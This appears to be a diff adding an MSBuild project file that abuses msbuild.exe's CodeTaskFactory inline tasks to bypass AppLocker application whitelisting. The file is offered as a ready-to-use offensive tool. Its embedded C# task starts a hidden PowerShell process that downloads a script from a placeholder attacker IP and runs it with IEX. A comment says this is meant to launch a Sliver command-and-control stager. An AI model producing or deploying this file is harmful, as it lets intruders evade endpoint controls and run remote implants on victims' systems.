@@ -1,0 +1,38 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--
+    AppLocker bypass via msbuild.exe inline task (CodeTaskFactory).
+    Usage:
+      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild-shellcode.xml
+    Edit the PowerShell command below before use.
+  -->
+  <Target Name="MSBuildBypass">
+    <MSBuildTask/>
+  </Target>
+
+  <UsingTask
+    TaskName="MSBuildTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using System.Diagnostics;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+
+          public class MSBuildTask : Task
+          {
+            public override bool Execute()
+            {
+              // ── Payload — download + run your Sliver stager / PowerShell payload ──
+              string cmd = "-nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')\"";
+              Process.Start("powershell.exe", cmd);
+              return true;
+            }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
